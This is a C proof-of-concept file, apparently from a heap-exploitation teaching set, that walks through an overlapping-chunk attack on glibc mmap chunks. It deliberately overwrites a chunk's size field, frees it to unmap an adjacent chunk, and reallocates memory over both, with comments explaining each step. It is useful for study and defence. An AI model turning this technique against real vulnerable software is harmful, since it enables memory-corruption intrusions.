#include <stdlib.h>
#include <stdio.h>

/*
Technique should work on all versions of GLibC
Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`

POC written by POC written by Maxwell Dulin (Strikeout) 
*/
int main(){
	/*
	A primer on Mmap chunks in GLibC
	==================================
	In GLibC, there is a point where an allocation is so large that malloc
	decides that we need a seperate section of memory for it, instead 
	of allocating it on the normal heap. This is determined by the mmap_threshold var.
	Instead of the normal logic for getting a chunk, the system call *Mmap* is 
	used. This allocates a section of virtual memory and gives it back to the user. 

	Similarly, the freeing process is going to be different. Instead 
	of a free chunk being given back to a bin or to the rest of the heap,
	another syscall is used: *Munmap*. This takes in a pointer of a previously 
	allocated Mmap chunk and releases it back to the kernel. 

	Mmap chunks have special bit set on the size metadata: the second bit. If this 
	bit is set, then the chunk was allocated as an Mmap chunk. 

	Mmap chunks have a prev_size and a size. The *size* represents the current 
	size of the chunk. The *prev_size* of a chunk represents the left over space
	from the size of the Mmap chunk (not the chunks directly belows size). 
	However, the fd and bk pointers are not used, as Mmap chunks do not go back 
	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of 
	the chunk must be page-aligned.

	The POC below is essentially an overlapping chunk attack but on mmap chunks. 
	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. 
	The main difference is that mmapped chunks have special properties and are 
	handled in different ways, creating different attack scenarios than normal 
	overlapping chunk attacks. There are other things that can be done, 
	such as munmapping system libraries, the heap itself and other things.
	This is meant to be a simple proof of concept to demonstrate the general 
	way to perform an attack on an mmap chunk.

	For more information on mmap chunks in GLibC, read this post: 
	http://tukan.farm/2016/07/27/munmap-madness/
	*/

	int* ptr1 = malloc(0x10); 

	printf("This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n");
	printf("Extremely large chunks are special because they are allocated in their own mmaped section\n");
	printf("of memory, instead of being put onto the normal heap.\n");
	puts("=======================================================\n");
	printf("Allocating three extremely large heap chunks of size 0x100000 \n\n");
		
	long long* top_ptr = malloc(0x100000);
	printf("The first mmap chunk goes directly above LibC: %p\n",top_ptr);

	// After this, all chunks are allocated downwards in memory towards the heap.
	long long* mmap_chunk_2 = malloc(0x100000);
	printf("The second mmap chunk goes below LibC: %p\n", mmap_chunk_2);

	long long* mmap_chunk_3 = malloc(0x100000);
	printf("The third mmap chunk goes below the second mmap chunk: %p\n", mmap_chunk_3);

	printf("\nCurrent System Memory Layout \n" \
"================================================\n" \
"running program\n" \
"heap\n" \
"....\n" \
"third mmap chunk\n" \
"second mmap chunk\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"first mmap chunk\n"
"===============================================\n\n" \
);
	
	printf("Prev Size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-2]);
	printf("Size of third mmap chunk: 0x%llx\n\n", mmap_chunk_3[-1]);

	printf("Change the size of the third mmap chunk to overlap with the second mmap chunk\n");	
	printf("This will cause both chunks to be Munmapped and given back to the system\n");
	printf("This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n");

	// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.
	// Additionally, this same attack can be used with the prev_size instead of the size.
	mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;
	printf("New size of third mmap chunk: 0x%llx\n", mmap_chunk_3[-1]);
	printf("Free the third mmap chunk, which munmaps the second and third chunks\n\n");

	/*
	This next call to free is actually just going to call munmap on the pointer we are passing it.
	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845

	With normal frees the data is still writable and readable (which creates a use after free on 
	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this
	data is read or written to, the program crashes.
	
	Because of this added restriction, the main goal is to get the memory back from the system
	to have two pointers assigned to the same location.
	*/
	// Munmaps both the second and third pointers
	free(mmap_chunk_3); 

	/* 
	Would crash, if on the following:
	mmap_chunk_2[0] = 0xdeadbeef;
	This is because the memory would not be allocated to the current program.
	*/

	/*
	Allocate a very large chunk with malloc. This needs to be larger than 
	the previously freed chunk because the mmapthreshold has increased to 0x202000.
	If the allocation is not larger than the size of the largest freed mmap 
	chunk then the allocation will happen in the normal section of heap memory.
	*/	
	printf("Get a very large chunk from malloc to get mmapped chunk\n");
	printf("This should overlap over the previously munmapped/freed chunks\n");
	long long* overlapping_chunk = malloc(0x300000);
	printf("Overlapped chunk Ptr: %p\n", overlapping_chunk);
	printf("Overlapped chunk Ptr Size: 0x%llx\n", overlapping_chunk[-1]);

	// Gets the distance between the two pointers.
	int distance = mmap_chunk_2 - overlapping_chunk;
	printf("Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n", distance);
	printf("Value of index 0 of mmap chunk 2 prior to write: %llx\n", mmap_chunk_2[0]);
	
	// Set the value of the overlapped chunk.
	printf("Setting the value of the overlapped chunk\n");
	overlapping_chunk[distance] = 0x1122334455667788;

	// Show that the pointer has been written to.
	printf("Second chunk value (after write): 0x%llx\n", mmap_chunk_2[0]);
	printf("Overlapped chunk value: 0x%llx\n\n", overlapping_chunk[distance]);
	printf("Boom! The new chunk has been overlapped with a previous mmaped chunk\n");
}
